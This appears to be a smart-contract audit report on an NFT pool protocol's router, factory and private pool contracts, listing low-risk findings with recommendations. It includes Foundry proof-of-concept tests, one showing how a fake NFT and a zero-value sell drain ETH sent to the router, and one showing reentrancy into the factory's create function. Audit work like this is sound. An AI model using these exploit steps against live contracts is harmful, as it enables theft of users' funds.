
| Letter | Name | Description |
|:--:|:-------:|:-------:|
| L  | Low risk | Potential risk |
| NC |  Non-critical | Non risky findings |
| R  | Refactor | Changing the code |
| O | Ordinary | Often found issues |


### Low Risk 

| Count | Explanation | Instances |
|:--:|:-------|:--:|
| [L-01] | If a user sends ETH direcly to ETH router it could be stolen by another  user  | 1 |
| [L-02] | Allowing  anyOne to reenter the `function create` in factory.sol may be problamatic   | 1 |
| [L-03] |  Use openzeppelin re-entrancyGuard     | 8 |
| [L-04] |  Use openzeppelin upgradable proxy  contracts   | 1 |
| [L-05] |  execute function in privatePool  is  a risky implementation    | 1 |

### Non-Critical 
| Count | Explanation | Instances |
|:--:|:-------|:--:|
| [N-01] | Floating Pragma | 5 |

| Total Found Issues | 17 |
|:--:|:--:|




### [L-01]   If a user send ETH directly to ETH router it could be stolen by another  user
---

copy the below code to test folder run  `forge test --match-contract  TestUser  -vvvv`
Lets say,
1 .Deloyer  creates a private Pool  ; 
2 . Alice sends ETH to router contract directly it triggers the receive function now 1 ETH is in router contract  
3 .  Bob create  a nft called fake just mint a  1 fake nft  token id 0  to address(privatePool)
4 . Bob just call sell function  with 0 ether ; 
Then   bobs contract will recieve alice's 1 ether ;
This could be a medium sevierity but I think users are not supposed to directly send ether to 
the router address but a user can accidently send eth to the ETH router   via receive()   ; 


```js
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

  

import "./Fixture.sol";

  
contract Fake is ERC721 {
    constructor() ERC721("FAKE", "FK") {}
    function mint(address to, uint256 id) public {
        _mint(to, id);
    }

    function tokenURI(
        uint256
    ) public view virtual override returns (string memory) {
        return "";
    }
}

  

contract TestUser is Fixture {
    //users
    address alice;
    address bob;
    address deployer;
    ///pool
    Fake fake;
    PrivatePool public privatePool;
    EthRouter.Buy[] public buys;
    uint256 public totalTokens = 0;
    uint256 public maxInputAmount = 0;

    function setUp() public {
        alice = makeAddr("Alice");
        bob = makeAddr("Bob");
        deployer = makeAddr("Deployer");
        fake = new Fake();
        vm.deal(address(this), 0 ether);
        vm.deal(address(alice), 1 ether);
        vm.deal(address(bob), 0 ether);
        vm.deal(address(deployer), 1 ether);
        vm.label(address(this), "ThisContract");
        vm.startPrank(deployer);
        _addBuy();
        vm.stopPrank();
        for (uint256 i = 0; i < buys.length; i++) {
            maxInputAmount += buys[i].baseTokenAmount;
        }
    }

    function _addBuy() internal {
        uint256[] memory empty = new uint256[](0);
        privatePool = factory.create{value: 1e18}(
            address(0),
            address(milady),
            10e18,
            10e18,
            200,
            100,
            bytes32(0),
            true,
            false,
            bytes32(address(this).balance), // random between each call to _addBuy
            empty,
            1e18
        );

        uint256[] memory tokenIds = new uint256[](1);
        for (uint256 i = 0; i < 1; i++) {
            milady.mint(address(privatePool), i + totalTokens);
            tokenIds[i] = i + totalTokens;
        }

  

        totalTokens += 1;
        (uint256 baseTokenAmount, , ) = privatePool.buyQuote(
            tokenIds.length * 1e18
        );
        buys.push(
            EthRouter.Buy({
                pool: payable(address(privatePool)),
                nft: address(milady),
                tokenIds: tokenIds,
                tokenWeights: new uint256[](0),
                proof: PrivatePool.MerkleMultiProof(
                    new bytes32[](0),
                    new bool[](0)
                ),
                baseTokenAmount: baseTokenAmount,
                isPublicPool: false
            })
        );
    }

    function test_RefundsExcessEth() public {
        bytes32[][] memory publicPoolProofs = new bytes32[][](0);
        EthRouter.Sell memory sell1 = EthRouter.Sell({
            pool: payable(address(privatePool)),
            nft: address(fake),
            tokenIds: new uint256[](0),
            tokenWeights: new uint256[](0),
            proof: PrivatePool.MerkleMultiProof(
                new bytes32[](0),
                new bool[](0)
            ),

            stolenNftProofs: new IStolenNftOracle.Message[](0),
            isPublicPool: false,
            publicPoolProofs: publicPoolProofs
        });

        EthRouter.Sell[] memory sells = new EthRouter.Sell[](1);
        sells[0] = sell1;
 
        console.log(
            "Balance of this contract before :  %s ",
            address(this).balance

        );

        console.log(
            "Before Alice sends  1 ether to ETH router : %s  ",
            address(alice).balance

        );

        vm.startPrank(alice);
        address(ethRouter).call{value: 1 ether}("");
        vm.stopPrank();

        vm.prank(bob);
        fake.mint(address(privatePool), 0);
        console.log(
            "Bob call sell  function with 0 ether and a fake contract  : %s  ",
            address(alice).balance

        );

        // ethRouter.buy{value: 10e18}(buys, 0, false);

        ethRouter.sell(sells, 0, 0, false);
        vm.stopPrank();
        console.log(
            "Balance of this contract After:  %s ",
            address(this).balance

        );
        console.log("After eth balance of Alice : %s ", address(alice).balance);
    }

}
```

```bash
Logs:
  Balance of this contract before :  0 
  Before Alice sends  1 ether to ETH router : 1000000000000000000  
  Bob call sell  function with 0 ether and a fake contract  : 0  
  Balance of this contract After:  1000000000000000000 
  After eth balance of Alice : 0 
```

### [L-2]   Allowing  anyOne to reenter the `function create` in factory.sol may be problamatic  

In function create   we have ,
```js
_safeMint(msg.sender, uint256(uint160(address(privatePool))));
```
So  a user can  do like this  , I can't  see any exploit here but a  mallicious user   can use any other logic inside  `` onERC721Received``  so there is a risk   , 

```js
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import "./Fixture.sol";

contract Testo1 is Fixture {
    PrivatePool public privatePool;
    EthRouter.Buy[] public buys;
    uint256 public totalTokens = 0;
    uint256 public maxInputAmount = 0;
    // uint n = 0;
    function setUp() public { vm.deal(address(this), 1000_000 ether); }
    function testbuy() external {
        uint256[] memory empty = new uint256[](0);
        privatePool = factory.create{value: 1e18}(
            address(0),
            address(milady),
            100e18,
            10e18,
            200,
            100,
            bytes32(0),
            true,
            false,
            bytes32(address(this).balance), // random between each call to _addBuy
            empty,
            1e18
        );
    }
    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external virtual override returns (bytes4) {
        uint256[] memory empty = new uint256[](0);
        bytes memory data = abi.encodeWithSignature("create(address,address,uint128,uint128,uint56,uint16,bytes32,bool,bool,bytes32,uint256[],uint256)",
            address(0),
            address(milady),
            100e18,
            10e18,
            200,
            100,
            bytes32(0),
            true,
            false,
            bytes32(address(this).balance),
            empty,
            1e18
        );
        (bool sucess, ) = address(factory).call{value: 1 ether}(data);
        return ERC721TokenReceiver.onERC721Received.selector;

    }

}
```
we get 
```
thread '<unknown>' has overflowed its stack
fatal runtime error: stack overflow
```
**Recommendation**
Best practice is to use openzeppelin re-entrancy guard  for function that   we use _safeMint() ;
https://samczsun.com/the-dangers-of-surprising-code



### [L-3]   Use openzeppelin re-entrancyGuard  
Most of the contracts which are having functions that have external calls  have not implemented  re- entrancy guard so make sure to add  `non- reentrant modifier`  for sunch functions specially buy, sell deposit ,withdraw functions ;

### [L-4]   Use openzeppelin upgradable proxy  contracts
In current implementation  privatePool is having a constructor and a initializer which is  not normal  ,better  to use  openzeppelin upgradable proxy , proxy patterns ;


### [L-5]   execute function in privatePool  is  a risky implementation 
Owner of the pool is given  ability to  pass any kind of bytes data so owner can even call  `target` address 
as  `address(this)` ;    so make sure to limit the acess given to the each privatePool owner  this implemetation  might   be   very risky  ;     
```js
 function execute(address target, bytes memory data) public payable onlyOwner returns (bytes memory) {// call the target with the value and data
 (bool success, bytes memory returnData) = target.call{value: msg.value}(data);
    // if the call succeeded return the return data
    if (success) return returnData;
```


## [N-0] Floating Pragma

**Description**: 
Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively.

**Recommendation**
Consider locking the pragma version.

